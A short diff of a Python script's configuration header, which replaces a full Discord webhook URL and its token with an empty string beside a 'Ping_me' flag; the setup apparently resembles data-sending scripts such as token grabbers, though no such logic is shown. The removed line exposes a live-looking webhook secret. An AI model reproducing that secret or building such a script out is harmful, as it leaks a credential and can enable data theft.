@@ -12,7 +12,7 @@
 
 import os, re, json, urllib.request,requests,datetime
 
-WEBHOOK_URL = 'https://discord.com/api/webhooks/904260486206459965/4MrR06q5Wb1QXKJbUevhPzBKTfkm_q8r8AsO5lwvisWVJdfp_WI6DmkW0bV_LlfVyDj1'
+WEBHOOK_URL = ''
 # Type your discord webhook url over here
 
 Ping_me = True
